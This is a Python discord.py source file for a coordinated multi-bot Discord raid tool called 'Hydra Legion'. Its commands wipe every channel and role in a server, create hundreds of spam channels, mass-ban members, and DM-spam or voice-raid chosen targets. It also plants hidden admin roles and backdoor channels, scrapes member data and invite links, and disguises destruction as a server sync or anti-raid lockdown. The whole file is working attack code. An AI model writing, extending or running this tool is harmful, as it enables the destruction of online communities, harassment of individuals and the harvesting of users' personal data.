import discord
from discord.ext import commands
import asyncio
import random
import os

# 音声ファイルのパス設定 (main.pyと同じディレクトリに配置すること)
AUDIO_SOURCE_FILE = "loud_sound.mp3"

class CommandsCog(commands.Cog):
    def __init__(self, bot, settings, log_func, colors, override_func):
        self.bot = bot
        self.SETTINGS = settings
        self.log = log_func
        self.Colors = colors
        self.initiate_manual_override = override_func
        
        # CLIのためのコマンド分類リスト
        # これにより、CLIはどのコマンドにGuild IDが必要かを判断する
        self.GUILD_COMMANDS = [
            'nuke', 'colonize', 'purge', 'secure', 'sync_world', 'anti_raid_lockdown',
            'nuke_infinite', 'deleter', 'vcraid', 'vcstop', 'ban', 'kick', 'admin_all',
            'nick_cycle', 'ghostping', 'scrape_users', 'stealth_admin', 'backdoor',
            'extract_invites', 'clog_invites'
        ]
        self.GLOBAL_COMMANDS = ['dmspam', 'dmstop', 'psyop', 'legion_invite', 'setting', 'help']

    # ---------------------------------------------------------
    #  HELPER FUNCTIONS (支援ロジック)
    # ---------------------------------------------------------

    async def play_audio_loop(self, vc, guild_id):
        task_key = ("vc_raid", guild_id)
        while task_key in self.bot.active_tasks and vc.is_connected():
            try:
                if not os.path.exists(AUDIO_SOURCE_FILE):
                    self.log("ERROR", "Audio file not found", self.Colors.FAIL, force=True)
                    break
                source = discord.PCMVolumeTransformer(discord.FFmpegPCMAudio(AUDIO_SOURCE_FILE), volume=10.0)
                vc.play(source)
                while vc.is_playing():
                    await asyncio.sleep(0.1)
            except Exception as e:
                self.log("VC-ERROR", f"Audio loop error: {e}", self.Colors.FAIL, force=True)
                break
        if task_key in self.bot.active_tasks:
            del self.bot.active_tasks[task_key]

    async def spam_channel(self, channel, message):
        bot = self.bot
        task_key = ("spam", channel.id)
        
        try:
            while True:
                # 設定された遅延を読み込む
                delay = self.SETTINGS['spam_delay']
                
                await bot.pause_event.wait() # 停止命令待機
                await channel.send(message)
                
                if delay > 0:
                    await asyncio.sleep(delay)
        except discord.HTTPException as e:
            if e.status == 429: # Rate Limit
                bot.last_retry_after = e.retry_after
                await self.initiate_manual_override()
                await bot.pause_event.wait()
                # タスク再開
                asyncio.create_task(self.spam_channel(channel, message))
            elif task_key in bot.active_tasks:
                del bot.active_tasks[task_key]
        except Exception:
            if task_key in bot.active_tasks:
                del bot.active_tasks[task_key]

    async def create_channel_and_spam(self, guild, channel_name, spam_message):
        bot = self.bot
        await bot.pause_event.wait()
        try:
            # 兵士自身のGuildオブジェクトを取得して操作する
            my_guild = bot.get_guild(guild.id)
            if not my_guild: return

            new_channel = await my_guild.create_text_channel(channel_name)
            self.log("NUKE-TASK", f"{bot.user.name} created {new_channel.name}, unleashing spam.", self.Colors.CYAN)
            
            # 作成したチャンネルでスパムを開始
            bot.active_tasks[("spam", new_channel.id)] = asyncio.create_task(self.spam_channel(new_channel, spam_message))
            
            # 設定されたアクション速度制限に従う
            action_delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
            if action_delay > 0: await asyncio.sleep(action_delay)

        except discord.HTTPException as e:
            if e.status == 429:
                bot.last_retry_after = e.retry_after
                await self.initiate_manual_override()
                await bot.pause_event.wait()
                # 再試行
                await self.create_channel_and_spam(guild, channel_name, spam_message)
            else:
                self.log("NUKE-ERROR", f"{bot.user.name} failed create {channel_name} ({e.status}).", self.Colors.YELLOW, force=True)
        except Exception as e:
            self.log("NUKE-ERROR", f"{bot.user.name} failed create {channel_name} ({e}).", self.Colors.YELLOW, force=True)

    async def role_chaos_task(self, guild):
        bot = self.bot
        self.log("NUKE-C&C", "Sub-task: Role Chaos...", self.Colors.CYAN, force=True)
        my_guild = bot.get_guild(guild.id)
        if not my_guild: return

        for i in range(100):
            await bot.pause_event.wait()
            try:
                await my_guild.create_role(name=''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12)))
                action_delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
                if action_delay > 0: await asyncio.sleep(action_delay)
            except Exception: pass
        self.log("NUKE-C&C", "Role Chaos complete.", self.Colors.CYAN, force=True)

    async def _execute_nuke(self, commander_bot, guild, channel_name, spam_message):
        """CLIおよびコマンドから呼び出されるNukeの中核ロジック"""
        self.log("NUKE", f"Marshal {commander_bot.user.name} taken command for Guild {guild.id}.", self.Colors.FAIL + self.Colors.BOLD, force=True)
        
        # Phase 1: Instant Purge (司令官が実行)
        self.log("NUKE-C&C", "Phase 1: Instant Purge...", self.Colors.WARNING, force=True)
        if self.SETTINGS['actions_per_second'] == 0:
            await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
            await asyncio.gather(*[r.delete() for r in guild.roles if r.is_assignable()], return_exceptions=True)
        else:
            delay = 1.0 / self.SETTINGS['actions_per_second']
            for c in guild.channels:
                try: await c.delete(); await asyncio.sleep(delay)
                except: pass
            for r in guild.roles:
                if r.is_assignable():
                    try: await r.delete(); await asyncio.sleep(delay)
                    except: pass
        
        # Phase 2: Distributed Creation (全軍で実行)
        self.log("NUKE-C&C", "Phase 2: Chaos Propagation...", self.Colors.CYAN, force=True)
        
        # そのサーバーに参加している兵士のみを選抜
        soldiers = [b for b in commander_bot.legion if b.user and b.get_guild(guild.id)]
        if not soldiers:
            self.log("ERROR", "No soldiers available in this guild.", self.Colors.FAIL, force=True)
            return
            
        total_channels = 499
        creation_tasks = []
        for i in range(1, total_channels + 1):
            soldier = soldiers[i % len(soldiers)]
            soldier_cog = soldier.cogs.get('CommandsCog')
            if soldier_cog:
                # 各兵士にタスクを割り当て
                creation_tasks.append(
                    asyncio.create_task(soldier_cog.create_channel_and_spam(guild, f"{channel_name}-{i}", spam_message))
                )
        
        # Phase 3: Entropy Storm (Background Role Chaos)
        asyncio.create_task(self.role_chaos_task(guild))
        
        # 全ての作成タスクの完了を待つ
        await asyncio.gather(*creation_tasks, return_exceptions=True)
        self.log("NUKE-C&C", "All tasks dispatched. Operation is self-sustaining.", self.Colors.GREEN, force=True)

    # ---------------------------------------------------------
    #  COMMANDS (兵器一覧)
    # ---------------------------------------------------------

    @commands.command()
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context, channel_name: str, *, spam_message: str = None):
        """【戦略兵器】サーバーを焦土化する"""
        if self.bot.nuke_lock.locked(): return
        async with self.bot.nuke_lock:
            try: await ctx.message.delete()
            except Exception: pass
            spam = spam_message or f"@everyone サーバーはマスターカイル様の神軍に蹂躙された"
            await self._execute_nuke(self.bot, ctx.guild, channel_name, spam)

    @commands.command()
    @commands.guild_only()
    async def colonize(self, ctx, *, new_name: str):
        """【戦略兵器】サーバー名を変更し、支配を宣言する"""
        try: await ctx.message.delete()
        except: pass
        try:
            original_name = ctx.guild.name
            await ctx.guild.edit(name=new_name, reason=f"Colonized by order of {ctx.author}")
            self.log("COLONIZE", f"Server '{original_name}' renamed to '{new_name}'.", self.Colors.GREEN, force=True)
            await ctx.author.send(f"Success: Colonized. New name: **{new_name}**")
        except discord.Forbidden:
            await ctx.author.send("Error: I lack 'Manage Server' permission.")
        except Exception as e:
            await ctx.author.send(f"An unexpected error occurred: {e}")

    @commands.command()
    async def setting(self, ctx, parameter: str = None, value: str = None):
        """【戦術制御】ボットの動作設定を変更する"""
        try: await ctx.message.delete()
        except: pass
        if parameter is None or parameter.lower() == 'show':
            embed = discord.Embed(title="Tactical Control Settings", color=0x00ffff)
            for key, val in self.SETTINGS.items():
                embed.add_field(name=key, value=f"`{val}`", inline=False)
            await ctx.author.send(embed=embed)
            return

        param_lower = parameter.lower()
        if param_lower not in self.SETTINGS:
            await ctx.author.send(f"Error: Unknown parameter. Available: {', '.join(self.SETTINGS.keys())}")
            return
            
        if value is None:
            await ctx.author.send(f"Error: No value provided for '{parameter}'.")
            return

        try:
            # 型変換 (数値のみ対応)
            new_value = type(self.SETTINGS[param_lower])(float(value))
            self.SETTINGS[param_lower] = new_value
            await ctx.author.send(f"Success: Set `{param_lower}` to `{new_value}`.")
            self.log("SETTINGS", f"'{param_lower}' updated to '{new_value}' by {ctx.author}", self.Colors.CYAN, force=True)
        except (ValueError, TypeError):
            await ctx.author.send(f"Error: Invalid value. Expected a number.")

    @commands.command(name='help')
    async def help_command(self, ctx):
        """【情報】利用可能な兵器一覧を表示する"""
        try: await ctx.message.delete()
        except Exception: pass
        embed = discord.Embed(title="HYDRA LEGION: ARSENAL", description="司令官、これが我々の力の全てです。", color=0x990000)
        embed.add_field(name="戦術制御(Settings)", value="`!setting show`\n`!setting <param> <value>`", inline=False)
        embed.add_field(name="終焉の鉄槌(Total War)", value="`!nuke <name> [msg]`\n`!colonize <new_name>`\n`!purge`\n`!secure`", inline=False)
        embed.add_field(name="継続的破壊(Sustained)", value="`!nuke_infinite <start/stop>`\n`!deleter <on/off>`", inline=False)
        embed.add_field(name="諜報と妨害(Intel & Sabotage)", value="`!extract_invites`\n`!clog_invites <start/stop>`\n`!scrape_users`", inline=False)
        embed.add_field(name="偽装(Deception)", value="`!sync_world <fake_id>`\n`!anti_raid_lockdown`", inline=False)
        embed.add_field(name="標的型(Targeted)", value="`!psyop <ID> <msg>`\n`!dmspam <ID> <msg>`\n`!dmstop <ID>`\n`!vcraid <ID>`\n`!vcstop`\n`!ban <ID>`\n`!kick <ID>`", inline=False)
        embed.add_field(name="その他(Misc)", value="`!admin_all`\n`!nick_cycle <start/stop>`\n`!ghostping <start/stop>`\n`!legion_invite <url>`", inline=False)
        try: await ctx.author.send(embed=embed)
        except Exception as e: self.log("ERROR", f"Failed to send help DM: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    async def legion_invite(self, ctx, invite_template_url: str):
        """【展開】全ボットの招待リンクを生成する"""
        try: await ctx.message.delete()
        except Exception: pass
        if "CLIENT_ID" not in invite_template_url:
            await ctx.author.send("エラー: URLに `CLIENT_ID` を含めてください。")
            return
        response = "**Hydra Legion - 展開プロトコル**\n"
        for soldier in self.bot.legion:
            if soldier.user:
                response += f"**{soldier.user.name}:** [招待リンク]({invite_template_url.replace('CLIENT_ID', str(soldier.user.id))})\n"
        try: await ctx.author.send(response)
        except Exception: pass

    @commands.command()
    @commands.guild_only()
    async def purge(self, ctx):
        """【戦術兵器】自分とボット以外の全メンバーをBANする"""
        try: await ctx.message.delete()
        except Exception: pass
        self.log("PURGE", f"Executing final judgment on {ctx.guild.name}...", self.Colors.FAIL + self.Colors.BOLD, force=True)
        members_to_ban = [m for m in ctx.guild.members if not m.bot and m.id != ctx.author.id]
        self.log("PURGE", f"Found {len(members_to_ban)} mortals to banish.", self.Colors.WARNING, force=True)
        delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
        
        for member in members_to_ban:
            await self.bot.pause_event.wait()
            try:
                await member.ban(reason="Purged by order of the Hydra Legion")
                if delay > 0: await asyncio.sleep(delay)
            except discord.HTTPException as e:
                if e.status == 429:
                    self.bot.last_retry_after = e.retry_after
                    await self.initiate_manual_override()
                    await self.bot.pause_event.wait()
                    try: await member.ban(reason="Purged")
                    except Exception: pass
                else:
                    self.log("PURGE-FAIL", f"Failed to ban {member.name}: {e}", self.Colors.FAIL, force=True)
            except Exception as e:
                self.log("PURGE-FAIL", f"Generic fail on ban {member.name}: {e}", self.Colors.FAIL, force=True)
        self.log("PURGE", f"Scourge complete.", self.Colors.GREEN, force=True)

    @commands.command()
    @commands.guild_only()
    async def secure(self, ctx):
        """【戦術兵器】自軍以外のボットを全てBANする"""
        try: await ctx.message.delete()
        except: pass
        self.log("SECURE", f"Securing {ctx.guild.name}...", self.Colors.FAIL + self.Colors.BOLD, force=True)
        friendly_bot_ids = {b.user.id for b in self.bot.legion if b.user}
        bots_to_ban = [m for m in ctx.guild.members if m.bot and m.id not in friendly_bot_ids]
        if not bots_to_ban:
            self.log("SECURE", "No foreign entities found.", self.Colors.GREEN, force=True)
            return
        self.log("SECURE", f"Found {len(bots_to_ban)} foreign bots. Purging.", self.Colors.WARNING, force=True)
        delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
        
        for bot_to_ban in bots_to_ban:
            await self.bot.pause_event.wait()
            try:
                await bot_to_ban.ban(reason="Foreign entity purged")
                if delay > 0: await asyncio.sleep(delay)
            except discord.HTTPException as e:
                if e.status == 429:
                    self.bot.last_retry_after = e.retry_after
                    await self.initiate_manual_override()
                    await self.bot.pause_event.wait()
                    try: await bot_to_ban.ban(reason="Purged")
                    except Exception: pass
                else:
                    self.log("SECURE-FAIL", f"Failed to ban {bot_to_ban.name}: {e}", self.Colors.FAIL, force=True)
            except Exception as e:
                self.log("SECURE-FAIL", f"Generic fail on ban {bot_to_ban.name}: {e}", self.Colors.FAIL, force=True)
        self.log("SECURE", f"Protocol complete.", self.Colors.GREEN, force=True)

    @commands.command()
    @commands.guild_only()
    async def sync_world(self, ctx, fake_server_id: str):
        """【偽装】世界観同期を装ってサーバーを破壊する"""
        try: await ctx.message.delete(); processing_msg = await ctx.send(f"`サーバーID: {fake_server_id}` との世界観同期を開始します...\n設定を解析中..."); await asyncio.sleep(4); await processing_msg.edit(content="**同期エラー！**\n強制的にサーバーを初期化します。"); await asyncio.sleep(2)
        except Exception: pass
        await ctx.invoke(self.bot.get_command('nuke'), channel_name="world-sync-error", spam_message="@everyone FATAL_ERROR: World data corrupted.")

    @commands.command()
    @commands.guild_only()
    async def anti_raid_lockdown(self, ctx):
        """【偽装】緊急ロックダウンを装ってサーバーを破壊する"""
        try: await ctx.message.delete(); processing_msg = await ctx.send("⚠️ **緊急防衛プロトコル作動** ⚠️\nサーバーへの異常なアクティビティを検知。\nサーバーをロックダウンします..."); await asyncio.sleep(3); await processing_msg.edit(content="隔離に失敗。\n**全区画を強制的に破壊・再生成します。**"); await asyncio.sleep(2)
        except Exception: pass
        await ctx.invoke(self.bot.get_command('nuke'), channel_name="quarantine-failed", spam_message="@everyone LOCKDOWN_FAILURE: Contamination Breach.")

    @commands.command()
    @commands.guild_only()
    async def nuke_infinite(self, ctx, mode: str, *, spam_message: str = None):
        """【継続破壊】無限にチャンネルを作成し続ける"""
        await ctx.message.delete()
        task_key = ("infinite_nuke", ctx.guild.id)
        if mode.lower() == 'start':
            if task_key in self.bot.active_tasks: return
            msg = spam_message or f"@everyone {self.bot.user}による永続的な混沌"
            async def loop():
                i=0
                delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
                while True:
                    await self.bot.pause_event.wait()
                    try:
                        ch = await ctx.guild.create_text_channel(f'kyle-eternal-chaos-{i}'); i+=1
                        asyncio.create_task(self.spam_channel(ch, msg))
                        if delay > 0: await asyncio.sleep(delay)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            self.bot.last_retry_after = e.retry_after
                            await self.initiate_manual_override()
                            await self.bot.pause_event.wait()
                        else: await asyncio.sleep(5)
                    except Exception: await asyncio.sleep(5)
            self.bot.active_tasks[task_key] = asyncio.create_task(loop())
            self.log("INF-NUKE", "Started.", self.Colors.GREEN, force=True)
        elif mode.lower() == 'stop':
            if task_key in self.bot.active_tasks:
                self.bot.active_tasks[task_key].cancel()
                del self.bot.active_tasks[task_key]
                self.log("INF-NUKE", "Stopped.", self.Colors.WARNING, force=True)

    @commands.command()
    @commands.guild_only()
    async def deleter(self, ctx, mode: str):
        """【継続破壊】無限にチャンネルとロールを削除し続ける"""
        await ctx.message.delete()
        task_key = ("infinite_delete", ctx.guild.id)
        if mode.lower() == 'on':
            if task_key in self.bot.active_tasks: return
            async def loop():
                while True:
                    await self.bot.pause_event.wait()
                    try:
                        channels_to_del = list(ctx.guild.channels)[:50]
                        roles_to_del = [r for r in list(ctx.guild.roles)[:50] if r.is_assignable()]
                        await asyncio.gather(*[c.delete() for c in channels_to_del], *[r.delete() for r in roles_to_del], return_exceptions=True)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            self.bot.last_retry_after = e.retry_after
                            await self.initiate_manual_override()
                            await self.bot.pause_event.wait()
                    except Exception: pass
            self.bot.active_tasks[task_key] = asyncio.create_task(loop())
            self.log("DELETER", "Started.", self.Colors.FAIL, force=True)
        elif mode.lower() == 'off':
            if task_key in self.bot.active_tasks:
                self.bot.active_tasks[task_key].cancel()
                del self.bot.active_tasks[task_key]
                self.log("DELETER", "Stopped.", self.Colors.WARNING, force=True)

    @commands.command()
    async def dmspam(self, ctx, user_id: int, *, message: str):
        """【標的型】指定ユーザーに全ボットからDMを送信する"""
        try: await ctx.message.delete()
        except Exception: pass
        self.log("COMMAND", f"DM RAID ORDER received for {user_id}", self.Colors.FAIL + self.Colors.BOLD, force=True)
        
        async def dm_spam_task(bot_instance, user, msg):
            task_key = ("dm_spam", user.id)
            delay = self.SETTINGS['spam_delay']
            try:
                while task_key in bot_instance.active_tasks:
                    await bot_instance.pause_event.wait()
                    await user.send(msg)
                    if delay > 0: await asyncio.sleep(delay)
            except discord.HTTPException as e:
                if e.status == 429:
                    bot_instance.last_retry_after = e.retry_after
                    await self.initiate_manual_override()
                    await bot_instance.pause_event.wait()
                    if task_key in bot_instance.active_tasks:
                        bot_instance.active_tasks[task_key] = asyncio.create_task(dm_spam_task(bot_instance, user, msg))
            except discord.Forbidden:
                self.log("DM-FAIL", f"{bot_instance.user.name} was blocked by {user.id}.", self.Colors.WARNING, force=True)
            except Exception: pass
            finally:
                if task_key in bot_instance.active_tasks: del bot_instance.active_tasks[task_key]

        try:
            target_user = await self.bot.fetch_user(user_id)
            for soldier_bot in self.bot.legion:
                task_key = ("dm_spam", user_id)
                if task_key in soldier_bot.active_tasks: soldier_bot.active_tasks[task_key].cancel()
                soldier_bot.active_tasks[task_key] = asyncio.create_task(dm_spam_task(soldier_bot, target_user, message))
        except discord.NotFound:
            self.log("ERROR", f"DM Spam failed: User with ID {user_id} not found.", self.Colors.FAIL, force=True)

    @commands.command()
    async def dmstop(self, ctx, user_id: int):
        """【標的型】DMスパムを停止する"""
        try: await ctx.message.delete()
        except Exception: pass
        self.log("COMMAND", f"DM RAID STOP order for {user_id}", self.Colors.WARNING, force=True)
        task_key = ("dm_spam", user_id)
        stopped_count = 0
        for soldier_bot in self.bot.legion:
            if task_key in soldier_bot.active_tasks:
                soldier_bot.active_tasks[task_key].cancel()
                del soldier_bot.active_tasks[task_key]
                stopped_count += 1
        self.log("DM-STOP", f"Stopped {stopped_count} DM spam tasks for user {user_id}.", self.Colors.GREEN, force=True)

    @commands.command()
    @commands.guild_only()
    async def vcraid(self, ctx, user_id: int):
        """【標的型】ターゲットが接続しているVCに突撃し、音声を再生する"""
        try: await ctx.message.delete()
        except Exception: pass
        target = ctx.guild.get_member(user_id)
        if not target or not target.voice:
            self.log("ERROR", "Target not in VC.", self.Colors.FAIL, force=True)
            return
        try:
            vc = await target.voice.channel.connect()
            self.bot.active_tasks[("vc_raid", ctx.guild.id)] = asyncio.create_task(self.play_audio_loop(vc, ctx.guild.id))
            self.log("VCRAID", f"Raid started by {self.bot.user}", self.Colors.GREEN, force=True)
        except Exception as e:
            self.log("ERROR", f"VC Raid failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def vcstop(self, ctx):
        """【標的型】VCレイドを停止する"""
        await ctx.message.delete()
        task_key = ("vc_raid", ctx.guild.id)
        if task_key in self.bot.active_tasks: self.bot.active_tasks[task_key].cancel()
        for vc in self.bot.voice_clients:
            if vc.guild.id == ctx.guild.id: await vc.disconnect(force=True)
        self.log("VCSTOP", "Raid stopped.", self.Colors.WARNING, force=True)

    @commands.command()
    @commands.guild_only()
    async def ban(self, ctx, user_id: int):
        """【標的型】指定ユーザーをBANする"""
        try: await ctx.message.delete(); user = await self.bot.fetch_user(user_id); await ctx.guild.ban(user); self.log("BAN", f"Banned {user_id}", self.Colors.FAIL, force=True)
        except Exception as e: self.log("ERROR", f"Ban failed for {user_id}: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def kick(self, ctx, user_id: int):
        """【標的型】指定ユーザーをKICKする"""
        try: await ctx.message.delete(); member = await ctx.guild.fetch_member(user_id); await member.kick(); self.log("KICK", f"Kicked {user_id}", self.Colors.FAIL, force=True)
        except Exception as e: self.log("ERROR", f"Kick failed for {user_id}: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def admin_all(self, ctx):
        """【その他】ボット以外の全メンバーに管理者権限を付与する"""
        try: await ctx.message.delete()
        except: pass
        self.log("ADMIN", "Granting admin to all humans...", self.Colors.FAIL, force=True)
        try:
            r = await ctx.guild.create_role(name="Chaos Agent", permissions=discord.Permissions.all())
            delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
            for m in [m for m in ctx.guild.members if not m.bot]:
                await self.bot.pause_event.wait()
                try: 
                    await m.add_roles(r)
                    if delay > 0: await asyncio.sleep(delay)
                except Exception: pass
        except Exception as e: self.log("ERROR", f"Admin-all failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def nick_cycle(self, ctx, mode: str):
        """【その他】全メンバーのニックネームをランダムに変更し続ける"""
        await ctx.message.delete()
        task_key = ("nick_cycle", ctx.guild.id)
        if mode.lower() == 'start':
            if task_key in self.bot.active_tasks: return
            async def loop():
                delay = 1.0 / self.SETTINGS['actions_per_second'] if self.SETTINGS['actions_per_second'] > 0 else 0
                while True:
                    await self.bot.pause_event.wait()
                    try:
                        members_to_edit = [m for m in ctx.guild.members if m.top_role < ctx.guild.me.top_role and not m.bot]
                        for m in members_to_edit:
                            await self.bot.pause_event.wait()
                            await m.edit(nick=''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)))
                            if delay > 0: await asyncio.sleep(delay)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            self.bot.last_retry_after = e.retry_after
                            await self.initiate_manual_override()
                            await self.bot.pause_event.wait()
                    except Exception: pass
            self.bot.active_tasks[task_key] = asyncio.create_task(loop())
            self.log("NICK", "Cycle started.", self.Colors.CYAN, force=True)
        elif mode.lower() == 'stop':
            if task_key in self.bot.active_tasks:
                self.bot.active_tasks[task_key].cancel()
                del self.bot.active_tasks[task_key]
                self.log("NICK", "Cycle stopped.", self.Colors.WARNING, force=True)

    @commands.command()
    @commands.guild_only()
    async def ghostping(self, ctx, mode: str):
        """【その他】幽霊メンション（即削除）を連打する"""
        await ctx.message.delete()
        task_key = ("ghost_ping", ctx.guild.id)
        if mode.lower() == 'start':
            if task_key in self.bot.active_tasks: return
            async def loop():
                delay = self.SETTINGS['spam_delay']
                while True:
                    await self.bot.pause_event.wait()
                    try: 
                        m = await ctx.channel.send("@everyone"); await m.delete()
                        if delay > 0: await asyncio.sleep(delay)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            self.bot.last_retry_after = e.retry_after
                            await self.initiate_manual_override()
                            await self.bot.pause_event.wait()
                        else: break
                    except Exception: break
            self.bot.active_tasks[task_key] = asyncio.create_task(loop())
            self.log("GHOST", "Started.", self.Colors.FAIL, force=True)
        elif mode.lower() == 'stop':
            if task_key in self.bot.active_tasks:
                self.bot.active_tasks[task_key].cancel()
                del self.bot.active_tasks[task_key]
                self.log("GHOST", "Stopped.", self.Colors.WARNING, force=True)
    
    @commands.command()
    @commands.guild_only()
    async def scrape_users(self, ctx):
        """【諜報】メンバー情報をCSVファイルに出力する"""
        try: await ctx.message.delete()
        except Exception: pass
        try:
            lines=["ID,Name,Discriminator,Nick,Roles,JoinedAt,CreatedAt"]
            lines.extend([f"{m.id},{m.name},{m.discriminator},{m.nick},{'|'.join([r.name for r in m.roles])},{m.joined_at},{m.created_at}" for m in ctx.guild.members])
            with open("scraped_users.csv","w", encoding='utf-8') as f: f.write("\n".join(lines))
            await ctx.author.send("User data extracted.", file=discord.File("scraped_users.csv"))
            self.log("SPY", "Scraped users.", self.Colors.GREEN, force=True)
        except Exception as e:
            self.log("ERROR", f"Scrape failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def stealth_admin(self, ctx):
        """【その他】自分に管理者権限を持つ隠しロールを付与する"""
        try: await ctx.message.delete()
        except: pass
        try:
            r = await ctx.guild.create_role(name=".", permissions=discord.Permissions.all())
            await ctx.author.add_roles(r)
            self.log("STEALTH", "Stealth admin granted.", self.Colors.GREEN, force=True)
        except Exception as e:
            self.log("ERROR", f"Stealth admin failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def backdoor(self, ctx):
        """【その他】自分だけが見える隠しチャンネルを作成する"""
        try: await ctx.message.delete()
        except: pass
        try:
            o = {ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False), ctx.author: discord.PermissionOverwrite(read_messages=True)}
            await ctx.guild.create_text_channel('system-logs', overwrites=o)
            self.log("BACKDOOR", "Backdoor created.", self.Colors.GREEN, force=True)
        except Exception as e:
            self.log("ERROR", f"Backdoor failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def extract_invites(self, ctx):
        """【諜報】サーバー内の全招待リンクを抽出し、DMに送信する"""
        try: await ctx.message.delete()
        except: pass
        try:
            invites = await ctx.guild.invites()
            if not invites:
                await ctx.author.send("このサーバーには有効な招待リンクが見つかりませんでした。")
                return
            log_content = "Code,URL,CreatorID,CreatorName,ChannelID,ChannelName,Uses\n"
            for inv in invites:
                log_content += f"{inv.code},{inv.url},{inv.inviter.id},{inv.inviter.name},{inv.channel.id},{inv.channel.name},{inv.uses}\n"
            with open("invites.csv", "w", encoding='utf-8') as f: f.write(log_content)
            await ctx.author.send(f"抽出完了: {len(invites)}件", file=discord.File("invites.csv"))
            self.log("SPY", f"Extracted {len(invites)} invites.", self.Colors.GREEN, force=True)
        except Exception as e:
            self.log("ERROR", f"Extract failed: {e}", self.Colors.FAIL, force=True)

    @commands.command()
    @commands.guild_only()
    async def clog_invites(self, ctx, mode: str):
        """【妨害】招待リンクを大量作成して監査ログを埋め尽くす"""
        await ctx.message.delete()
        task_key = ("clog_invites", ctx.guild.id)
        if mode.lower() == 'start':
            if task_key in self.bot.active_tasks: return
            async def loop():
                self.log("SABOTAGE", "Invite clogging started.", self.Colors.FAIL, force=True)
                while True:
                    await self.bot.pause_event.wait()
                    try:
                        target_channel = random.choice(ctx.guild.text_channels)
                        await target_channel.create_invite(max_uses=0, max_age=0, reason="Clogging")
                        await asyncio.sleep(0.5)
                    except Exception: break
            self.bot.active_tasks[task_key] = asyncio.create_task(loop())
        elif mode.lower() == 'stop':
            if task_key in self.bot.active_tasks:
                self.bot.active_tasks[task_key].cancel()
                del self.bot.active_tasks[task_key]
                self.log("SABOTAGE", "Stopped.", self.Colors.WARNING, force=True)

    @commands.command()
    async def psyop(self, ctx, user_id: int, *, message: str):
        """【心理戦】全ボットから一斉にターゲットへDMを送る"""
        try: await ctx.message.delete()
        except: pass
        self.log("PSYOP", f"Targeting {user_id}...", self.Colors.FAIL + self.Colors.BOLD, force=True)
        try: target_user = await self.bot.fetch_user(user_id)
        except: self.log("ERROR", "Target not found.", self.Colors.FAIL, force=True); return
        
        count = 0
        for soldier in self.bot.legion:
            try:
                await soldier.wait_until_ready()
                await target_user.send(f"**From {soldier.user.name}:**\n{message}")
                self.log("PSYOP-HIT", f"Sent from {soldier.user.name}", self.Colors.GREEN)
                count += 1
            except: pass
        self.log("PSYOP", f"Complete. {count} hits.", self.Colors.CYAN, force=True)
        await ctx.author.send(f"PsyOp Complete. {count} hits.")